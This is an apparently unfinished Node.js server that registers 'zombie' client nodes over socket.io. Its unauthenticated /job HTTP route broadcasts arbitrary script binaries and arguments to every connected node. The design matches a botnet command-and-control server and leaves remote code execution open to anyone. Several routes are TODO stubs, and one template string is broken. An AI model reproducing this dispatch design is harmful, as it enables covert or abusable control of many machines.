// Node Libraries
const express = require("express")
const master_socket_server = require('http').createServer();
var body_parser = require("body-parser");
const io = require('socket.io')(master_socket_server);

// Globals
const server_port = 10001
const master_socket_port = 10002

const server_express_object = express()
server_express_object.use(body_parser.urlencoded({ extended: false }));
server_express_object.use(body_parser.json());




function map_to_json(inputMap) {
    let obj = {};

    inputMap.forEach(function(value, key){
        console.log(key.id, value)
        obj[key.id] = value
    });

    return obj;
}





let currently_connected_zombies = new Map() // map that stores the information of all zombie nodes

let job_id_counter = 0 //monotonically increases with each job 

/*
    Firing up the routines...
*/





const main = () => {
    // routes of server service
    
    // returns the list of active zombies.
    server_express_object.route("/zombies").get((req,res)=>{
        res.status(200).json({
            message: JSON.stringify(map_to_json(currently_connected_zombies))
        });
    })
    
    server_express_object.route("/job").post((req,res)=>{
        console.log(req.body)

        for (const [zombie, zombie_data] of currently_connected_zombies.entries()) {

            zombie.emit("run_script", {
                job_id: job_id_counter, 
                script_name : req.body.script_name, 
                script_binary: req.body.script_binary,
                script_args: req.body.args 
            })

        }
        
        res.status(200).json({
            message: 'Job spawned with id=${id}'
        })

        job_id_counter++;
    })

    // TODO: get information regarding job, including the relevant files etc? (too much complexity here? where to handle this complexity?)
    server_express_object.route("/job").get((req,res)=>{
        // TODO: implement this route...
        res.status(200).json({
            message: 'job incomplete...'
        });
    })

    // TODO: description of active jobs? We need this endpoint?
    server_express_object.route("/status").get((req,res)=>{
        // TODO: implement this route...
        res.status(200).json({
            message: 'Following jobs are currently running on zombie nodes...'
        });
    })


    
    


    io.on('connection', (socket) => {
        console.log(`Client connected [id=${socket.id}]`);
        
        currently_connected_zombies.set(socket, {});
        
        socket.on("zombie_info", (data) =>{
            currently_connected_zombies.set(socket, data)
        });

        socket.on("job_status", (data)=>{

        });

        socket.on("disconnect", () => {
            currently_connected_zombies.delete(socket);
            console.log(`Client gone [id=${socket.id}]`);
        });


    });
      









    server_express_object.listen(server_port, () => console.log("Server Service Listening on port " + String(server_port)+"!"))
    master_socket_server.listen(master_socket_port, () =>console.log("Master Service Running on port "+ String(master_socket_port)+ "!"));
}






main()



















